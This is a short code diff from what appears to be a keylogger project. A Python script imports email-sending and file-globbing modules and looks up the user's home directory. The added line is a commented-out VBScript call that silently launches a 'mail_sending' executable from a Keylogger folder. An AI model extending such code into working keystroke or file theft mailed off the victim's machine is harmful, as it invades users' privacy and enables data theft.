@@ -1,7 +1,7 @@
 import smtplib, os, glob
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-
+#WshShell.Run "C:\CodingProjects\C++\Keylogger-main\Keylogger\mail_sending\main.exe", 0, True
 file_data = ""
 #Find home directory
 home_dir = str(os.path.expanduser('~'))
